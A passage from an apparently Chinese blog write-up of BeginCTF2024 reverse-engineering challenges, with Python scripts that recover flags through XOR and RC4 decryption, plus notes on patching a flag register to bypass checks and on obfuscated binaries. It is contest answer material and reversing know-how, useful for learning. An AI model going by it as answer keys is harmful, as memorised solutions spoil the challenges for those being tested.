class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[i]<br>    lst4[i] ^= lst1[i]<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst3 + lst4])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>下面用动调做：</p><p>椰奶师傅说是要去符号表，这里本来就去了符号，不过链接好的地址没有去</p><p>符号通常是变量或函数的名称,符号表可用于确定变量或函数在内存中的位置。</p><p>所以strip一下可以去掉，现在就只剩下偏移了，而且可以直接动调到密文比较处</p><p><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383434998-9a474bb9-e10f-4823-a951-ebbe7fe2f827.jpeg" alt="img"><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395034732-b0682464-e242-4b37-b7de-45fd0a108417.png" alt="img"></p><p>真的从0x7f开头变成0x14开头啦，而且直接出</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383301549-bd5bee30-fd55-482a-a992-8533746e42ba.png" class="" title="img"><h2 id="红白机-1"><a href="#红白机-1" class="headerlink" title="红白机-1"></a>红白机-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707102089423-4d5eba26-ab01-4192-91f8-188e179b233a.png" class="" title="img"><p>6502汇编</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707112975854-4dec833c-428e-45f0-a499-d9a689ff1211.png" class="" title="img"><p>找不到flag头</p><p>结果跟我说在线网站</p><p><a href="https://itema-as.github.io/6502js/">https://itema-as.github.io/6502js/</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707396837801-52015591-99fe-4d24-abd2-93172b05f129.png" class="" title="img"><h2 id="俄语学习-1"><a href="#俄语学习-1" class="headerlink" title="俄语学习-1"></a>俄语学习-1</h2><p>直接乱输，然后修改zf绕过</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706752491098-e585956b-06d4-486d-9ba6-0748bec110c3.png" class="" title="img"><p>伪rc4？</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706753133019-c9c3925b-8148-4024-acc2-0973d7a0630b.png" class="" title="img"><p>str复制有点奇怪，是0到strlen，后面密文比较也是少了一位</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706758798885-0cfdbb8c-e207-411e-8b35-72cc4bb4a450.png" class="" title="img"><p>直接逆向跑出来这个鬼东西</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706759274005-f288eca0-6feb-4faa-82b4-80114557bd41.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python">s1=<span class="hljs-string">&#x27;m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n&#x27;</span><br>s2=<span class="hljs-string">&#x27;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&#x27;</span><br><span class="hljs-comment">#s2=[0x2b, 0x69, 0x26, 0x5b, 0x40, 0x59, 0x3a, 0x67, 0x38, 0x5b, 0x26, 0x6c, 0x24, 0x66, 0x38, 0x53, 0x38, 0x76, 0x24, 0x59, 0x26, 0x65, 0x3e, 0x7b]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s2))<br>a=[<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>,<br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>,<br>  <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>s_ni=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x2C</span>,<br>  <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x26</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br>s=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x27</span>,<br>  <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xE1</span>,<br>  <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">s,a</span>):<br>    i=<span class="hljs-number">0</span><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>):<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        j=(j+s[i])%<span class="hljs-number">256</span><br>        s[i],s[j]=s[j],s[i]<br>        a[k]^=s[(s[i]+s[j])%<span class="hljs-number">256</span>]<br>    <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rc4(s_ni,a)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        flag+=<span class="hljs-built_in">chr</span>(a[i]+<span class="hljs-number">112</span>-<span class="hljs-built_in">ord</span>(s1[i]))<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>后面显示说上面每答对一个问题，就填充一部分s盒，所以我的绕过会使s盒有问题，怪不得说正向加密也会不对</p><p>正确的s盒，果然和我的有差别</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707439204823-edbdf260-1e3b-49fa-a3ce-be558529e539.png" class="" title="img"><p>也可以直接猜是rc4，因为我找不到rc4的初始化过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-string">b&quot;5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e&quot;</span><br><span class="hljs-comment"># tmp[i] = flag[i] + t[i]-112</span><br><span class="hljs-keyword">from</span> Crypto.Cipher.ARC4 <span class="hljs-keyword">import</span> *<br>enc = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x41</span>])<br>rc4 = new(t)<br>p = rc4.decrypt(enc)<br><span class="hljs-built_in">print</span>(p)<br>p = <span class="hljs-built_in">list</span>(p)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>    p[i] = (p[i]+<span class="hljs-number">112</span>-t[i])&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(p))<br></code></pre></td></tr></table></figure><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707441120328-53d83018-9ea2-44fe-aa4f-fa2e2de7cb8f.png" class="" title="img"><p>还可以直接交叉引用（x）找资源</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662434882-6feb5db8-f44a-40fa-8ec9-8b44a01888b6.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662422315-caff5912-babb-4e66-bcc5-6ee6be8f6c4d.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662480862-2d632a90-b003-4300-9d15-2c5f2dea269e.png" class="" title="img"><h2 id="superguesser-1"><a href="#superguesser-1" class="headerlink" title="superguesser-1"></a>superguesser-1</h2><p>有很多这样的花指令，反编译错误在数据后面</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707117897382-e58f2155-9ef6-466c-869a-4461f6d67594.png" class="" title="img"><p>转化为数据之后无法创建函数</p><p>可能用脚本去花指令？</p><p>加了XObf混淆器</p><p>下硬件断点可以在这些字符串被引用的时候断下来</p><img 